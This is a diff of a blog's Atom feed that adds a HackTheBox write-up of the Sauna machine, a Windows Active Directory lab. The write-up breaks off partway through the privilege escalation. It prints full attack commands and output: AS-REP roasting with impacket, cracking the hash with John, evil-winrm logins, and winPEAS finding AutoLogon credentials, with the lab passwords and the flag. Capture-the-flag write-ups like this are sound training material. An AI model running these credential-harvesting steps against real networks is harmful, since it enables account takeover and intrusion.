@@ -1,5 +1,436 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-07-12T16:30:00+02:00</updated><entry><title>HTB: Book</title><link href="https://maggick.fr/2020/07/htb-book.html" rel="alternate"></link><published>2020-07-12T16:30:00+02:00</published><updated>2020-07-12T16:30:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-12:/2020/07/htb-book.html</id><summary type="html">&lt;p&gt;&lt;img alt="Book card" class="align-left" src="/media/2020.07/book_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-07-22T09:35:00+02:00</updated><entry><title>HTB: Sauna</title><link href="https://maggick.fr/2020/07/htb-sauna.html" rel="alternate"></link><published>2020-07-22T09:35:00+02:00</published><updated>2020-07-22T09:35:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-22:/2020/07/htb-sauna.html</id><summary type="html">&lt;p&gt;&lt;img alt="Craft card" class="align-left" src="/media/2020.07/sauna_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;XXX TODO Link to forest article (if already pusblished)&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/229"&gt;Sauna&lt;/a&gt; published on
+February the 15th 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/94858"&gt;egotisticalSW&lt;/a&gt;
+This box is classified as an easy machine. This box has a lot of similarities
+with &lt;a href="todo link"&gt;forest&lt;/a&gt;: The user part require some smart enumeration. The
+second user also require to enumerate the box and the root part is a "simple"
+exploitation of the second user's privileges.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.07/sauna_card.png" alt="Craft card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;XXX TODO Link to forest article (if already pusblished)&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/229"&gt;Sauna&lt;/a&gt; published on
+February the 15th 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/94858"&gt;egotisticalSW&lt;/a&gt;
+This box is classified as an easy machine. This box has a lot of similarities
+with &lt;a href="todo link"&gt;forest&lt;/a&gt;: The user part require some smart enumeration. The
+second user also require to enumerate the box and the root part is a "simple"
+exploitation of the second user's privileges.&lt;/p&gt;
+
+
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;We start with an nmap scan. As always with the Windows boxes, a lot of services
+are exposed by the box.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Mon Feb 17 08:29:26 2020 as: nmap -p- -sS -oN nmap_ss 10.10.10.175&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.175&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.27s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65515 filtered ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT      STATE SERVICE&lt;/span&gt;
+&lt;span class="code-line"&gt;53/tcp    open  domain&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp    open  http&lt;/span&gt;
+&lt;span class="code-line"&gt;88/tcp    open  kerberos-sec&lt;/span&gt;
+&lt;span class="code-line"&gt;135/tcp   open  msrpc&lt;/span&gt;
+&lt;span class="code-line"&gt;139/tcp   open  netbios-ssn&lt;/span&gt;
+&lt;span class="code-line"&gt;389/tcp   open  ldap&lt;/span&gt;
+&lt;span class="code-line"&gt;445/tcp   open  microsoft-ds&lt;/span&gt;
+&lt;span class="code-line"&gt;464/tcp   open  kpasswd5&lt;/span&gt;
+&lt;span class="code-line"&gt;593/tcp   open  http-rpc-epmap&lt;/span&gt;
+&lt;span class="code-line"&gt;636/tcp   open  ldapssl&lt;/span&gt;
+&lt;span class="code-line"&gt;3268/tcp  open  globalcatLDAP&lt;/span&gt;
+&lt;span class="code-line"&gt;3269/tcp  open  globalcatLDAPssl&lt;/span&gt;
+&lt;span class="code-line"&gt;5985/tcp  open  wsman&lt;/span&gt;
+&lt;span class="code-line"&gt;9389/tcp  open  adws&lt;/span&gt;
+&lt;span class="code-line"&gt;49667/tcp open  unknown&lt;/span&gt;
+&lt;span class="code-line"&gt;49669/tcp open  unknown&lt;/span&gt;
+&lt;span class="code-line"&gt;49670/tcp open  unknown&lt;/span&gt;
+&lt;span class="code-line"&gt;49671/tcp open  unknown&lt;/span&gt;
+&lt;span class="code-line"&gt;49681/tcp open  unknown&lt;/span&gt;
+&lt;span class="code-line"&gt;57381/tcp open  unknown&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Mon Feb 17 08:43:53 2020 -- 1 IP address (1 host up) scanned in 867.44 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We run a version scan on the open ports. There is a IIS web server on port 80:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Mon Feb 17 08:45:29 2020 as: nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49681,57381 -sSV -oN nmap_ssv 10.10.10.175&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.175&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.31s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT      STATE SERVICE       VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;53/tcp    open  domain?&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp    open  http          Microsoft IIS httpd 10.0&lt;/span&gt;
+&lt;span class="code-line"&gt;88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-02-17 21:45:22Z)&lt;/span&gt;
+&lt;span class="code-line"&gt;135/tcp   open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn&lt;/span&gt;
+&lt;span class="code-line"&gt;389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)&lt;/span&gt;
+&lt;span class="code-line"&gt;445/tcp   open  microsoft-ds?&lt;/span&gt;
+&lt;span class="code-line"&gt;464/tcp   open  kpasswd5?&lt;/span&gt;
+&lt;span class="code-line"&gt;593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0&lt;/span&gt;
+&lt;span class="code-line"&gt;636/tcp   open  tcpwrapped&lt;/span&gt;
+&lt;span class="code-line"&gt;3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)&lt;/span&gt;
+&lt;span class="code-line"&gt;3269/tcp  open  tcpwrapped&lt;/span&gt;
+&lt;span class="code-line"&gt;5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
+&lt;span class="code-line"&gt;9389/tcp  open  mc-nmf        .NET Message Framing&lt;/span&gt;
+&lt;span class="code-line"&gt;49667/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49669/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0&lt;/span&gt;
+&lt;span class="code-line"&gt;49671/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49681/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;57381/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&lt;/span&gt;
+&lt;span class="code-line"&gt;SF-Port53-TCP:V=7.80%I=7%D=2/17%Time=5E4A9906%P=x86_64-pc-linux-gnu%r(DNSV&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:ersionBindReqTCP,20,&amp;quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:x04bind\0\0\x10\0\x03&amp;quot;);&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Mon Feb 17 08:48:06 2020 -- 1 IP address (1 host up) scanned in 156.46 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;The website is about the Egotistical Bank.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Sauna website" src="/media/2020.07/sauna_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;The only "interesting" page is the "about" page where we can get a list of the
+"amazing" team.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Sauna the &amp;quot;amazing&amp;quot; team" src="/media/2020.07/sauna_02.png"&gt;&lt;/p&gt;
+&lt;p&gt;We get the teams members and put them in a file. We try to guess the name
+convention use by the company. For instance, for the employee John Doe we try
+"john.doe", "jdoe", "jodoe". This give use a list of possible users as the
+following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;fergus.smith&lt;/span&gt;
+&lt;span class="code-line"&gt;hugo.bear&lt;/span&gt;
+&lt;span class="code-line"&gt;steven.kerb&lt;/span&gt;
+&lt;span class="code-line"&gt;shaun.coins&lt;/span&gt;
+&lt;span class="code-line"&gt;bowie.taylor&lt;/span&gt;
+&lt;span class="code-line"&gt;sophie.driver&lt;/span&gt;
+&lt;span class="code-line"&gt;fsmith&lt;/span&gt;
+&lt;span class="code-line"&gt;hbear&lt;/span&gt;
+&lt;span class="code-line"&gt;skerb&lt;/span&gt;
+&lt;span class="code-line"&gt;scoins&lt;/span&gt;
+&lt;span class="code-line"&gt;btaylor&lt;/span&gt;
+&lt;span class="code-line"&gt;sdriver&lt;/span&gt;
+&lt;span class="code-line"&gt;fesmith&lt;/span&gt;
+&lt;span class="code-line"&gt;hubear&lt;/span&gt;
+&lt;span class="code-line"&gt;stkerb&lt;/span&gt;
+&lt;span class="code-line"&gt;shcoins&lt;/span&gt;
+&lt;span class="code-line"&gt;botaylor&lt;/span&gt;
+&lt;span class="code-line"&gt;sodriver&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We launch &lt;a href="https://github.com/SecureAuthCorp/impacket/"&gt;impacket's&lt;/a&gt; script
+&lt;code&gt;GetNPUsers.py&lt;/code&gt; against our users list. We get the krb5tgs/Kerberoasting hash of the fsmith
+user.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python GetNPUsers.py  -dc-ip 10.10.10.175  egotisticalbank/ -usersfile ~/pentest/htb_sauna/users&lt;/span&gt;
+&lt;span class="code-line"&gt;Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
+&lt;span class="code-line"&gt;$krb5asrep$23$fsmith@EGOTISTICALBANK:7737b8e55d1ac7976a01e619a1268567$268f28ec59cfeda91a139f8f8c2c5cb9679d0dc04ba133f031b3021ebbd203888cd12633a0e604ad28420ff3fe41694d38f55b434bbe2af2b7ee0958a9a5705e4a880e2ecebb74a4d1aca73371cfcb73fb54a61520392d76079cc32bf3e128b87e3450d68361a84b4c686104e2fe13dc3cd7bd381a5ac87737ab8b95908bf0be409c7642fcfac3599aca04d19fd0f25f7bb4908a6fb496975f68ee3a4761ca406a43502b86410774127f25a5dc14c76dde7ac458df451dbcb093c4c6d069406e98c4839ecd6a0952a0850c289fab93e29682ec64cb690add83d0c6986c8f078bf25e53662f7d7fcc2c1e4740554036218a71320da2067a1298&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We crack that hash using John and the Rockyou dictionary getting fsmith
+password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;john hash -w=tools/password_lists/rockyou.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;krb5asrep&amp;quot;, but the string is also recognized as &amp;quot;krb5asrep-aes-opencl&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Use the &amp;quot;--format=krb5asrep-aes-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
+&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
+&lt;span class="code-line"&gt;Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])&lt;/span&gt;
+&lt;span class="code-line"&gt;Will run 4 OpenMP threads&lt;/span&gt;
+&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
+&lt;span class="code-line"&gt;Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICALBANK)&lt;/span&gt;
+&lt;span class="code-line"&gt;1g 0:00:00:19 DONE (2020-02-17 15:33) 0.05235g/s 551780p/s 551780c/s 551780C/s Thines..Thehulk2008&lt;/span&gt;
+&lt;span class="code-line"&gt;Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably&lt;/span&gt;
+&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We connect on the box with our fsmith account using
+&lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil-winrm&lt;/a&gt;. And get the user flag
+on his desktop.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ruby evil-winrm.rb -u fsmith -i 10.10.10.175 -p &amp;#39;Thestrokes23&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\FSmith\Documents&amp;gt; cat ../Desktop/user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;1b5520b98d97cf17f24122a55baf70cf&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
+&lt;h2 id="getting-svc_loanmgr"&gt;Getting svc_loanmgr&lt;/h2&gt;
+&lt;p&gt;We take a look at the other users on the box using &lt;code&gt;net user&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\FSmith\Documents&amp;gt; net user&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;User accounts for \\&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;-------------------------------------------------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Administrator            FSmith                   Guest&lt;/span&gt;
+&lt;span class="code-line"&gt;HSmith                   krbtgt                   svc_loanmgr&lt;/span&gt;
+&lt;span class="code-line"&gt;The command completed with one or more errors.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We upload
+&lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite"&gt;winPEAS.exe&lt;/a&gt;
+from the Privilege Escalation Awesome Scripts SUITE and run it on the box.&lt;/p&gt;
+&lt;p&gt;It found some AutoLogon credetials for the account &lt;code&gt;svc_loanmgr&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[+] Looking for AutoLogon credentials(T1012)&lt;/span&gt;
+&lt;span class="code-line"&gt;  Some AutoLogon credentials were found!!&lt;/span&gt;
+&lt;span class="code-line"&gt;      DefaultDomainName             :  EGOTISTICALBANK&lt;/span&gt;
+&lt;span class="code-line"&gt;      DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager&lt;/span&gt;
+&lt;span class="code-line"&gt;      DefaultPassword               :  Moneymakestheworldgoround!&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We connect on the box with the svc_loanmgr account using
+&lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil-winrm&lt;/a&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ruby evil-winrm.rb -u svc_loanmgr -i 10.10.10.175 -p &amp;#39;Moneymakestheworldgoround!&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="enumerating-our-users-privileges"&gt;Enumerating our user's privileges&lt;/h2&gt;
+&lt;p&gt;We run the &lt;code&gt;whoami /all&lt;/code&gt; command to list our user permissions but there is
+nothing interesting here: As the &lt;a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment"&gt;Microsoft documentation&lt;/a&gt;
+point out all our privileges and group are legitimate.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&amp;gt; whoami /all&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;USER INFORMATION&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;User Name                   SID&lt;/span&gt;
+&lt;span class="code-line"&gt;=========================== ==============================================&lt;/span&gt;
+&lt;span class="code-line"&gt;egotisticalbank\svc_loanmgr S-1-5-21-2966785786-3096785034-1186376766-1108&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;GROUP INFORMATION&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;mGroup Name                                  Type             SID          Attributes&lt;/span&gt;
+&lt;span class="code-line"&gt;=========================================== ================ ============ ==================================================&lt;/span&gt;
+&lt;span class="code-line"&gt;Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
+&lt;span class="code-line"&gt;BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
+&lt;span class="code-line"&gt;BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
+&lt;span class="code-line"&gt;BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
+&lt;span class="code-line"&gt;nNT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
+&lt;span class="code-line"&gt;NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
+&lt;span class="code-line"&gt;NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
+&lt;span class="code-line"&gt;NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
+&lt;span class="code-line"&gt;Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;PRIVILEGES INFORMATION&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Privilege Name                Description                    State&lt;/span&gt;
+&lt;span class="code-line"&gt;============================= ============================== =======&lt;/span&gt;
+&lt;span class="code-line"&gt;SeMachineAccountPrivilege     Add workstations to domain     Enabled&lt;/span&gt;
+&lt;span class="code-line"&gt;SeChangeNotifyPrivilege       Bypass traverse checking       Enabled&lt;/span&gt;
+&lt;span class="code-line"&gt;SeIncreaseWorkingSetPrivilege Increase a process working set Enabled&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;USER CLAIMS INFORMATION&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;User claims unknown.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Kerberos support for Dynamic Access Control on this device has been disabled.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&amp;gt; WHOAMI /PRIV&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;PRIVILEGES INFORMATION&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Privilege Name                Description                    State&lt;/span&gt;
+&lt;span class="code-line"&gt;============================= ============================== =======&lt;/span&gt;
+&lt;span class="code-line"&gt;SeMachineAccountPrivilege     Add workstations to domain     Enabled&lt;/span&gt;
+&lt;span class="code-line"&gt;SeChangeNotifyPrivilege       Bypass traverse checking       Enabled&lt;/span&gt;
+&lt;span class="code-line"&gt;SeIncreaseWorkingSetPrivilege Increase a process working set Enabled&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="getting-ad-privileges"&gt;Getting AD privileges&lt;/h2&gt;
+&lt;p&gt;We need to list our AD privileges.
+We upload &lt;a href="https://github.com/sense-of-security/ADRecon"&gt;ADRecon&lt;/a&gt; powershell
+script on the box, run it and download the results.&lt;/p&gt;
+&lt;p&gt;(for more information about AD attacks: &lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md"&gt;payloadallthethings&lt;/a&gt;.)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&amp;gt; upload /root/pentest/ADRecon.ps1 .\&lt;/span&gt;
+&lt;span class="code-line"&gt;Info: Uploading /root/pentest/ADRecon.ps1 to .\&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Data: 835464 bytes of 835464 bytes copied&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Info: Upload successful!&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&amp;gt; .\ADRecon.ps1&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] ADRecon v1.1 by Prashant Mahajan (@prashant3535)&lt;/span&gt;
+&lt;span class="code-line"&gt;Access denied&lt;/span&gt;
+&lt;span class="code-line"&gt;At C:\Users\svc_loanmgr\Documents\ADRecon.ps1:11249 char:25&lt;/span&gt;
+&lt;span class="code-line"&gt;+ ...           $computer = Get-CimInstance -ClassName Win32_ComputerSystem&lt;/span&gt;
+&lt;span class="code-line"&gt;+                           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&lt;/span&gt;
+&lt;span class="code-line"&gt;    + CategoryInfo          : PermissionDenied: (root\cimv2:Win32_ComputerSystem:String) [Get-CimInstance], CimException&lt;/span&gt;
+&lt;span class="code-line"&gt;    + FullyQualifiedErrorId : HRESULT 0x80041003,Microsoft.Management.Infrastructure.CimCmdlets.GetCimInstanceCommand&lt;/span&gt;
+&lt;span class="code-line"&gt;Computer Role could not be identified.&lt;/span&gt;
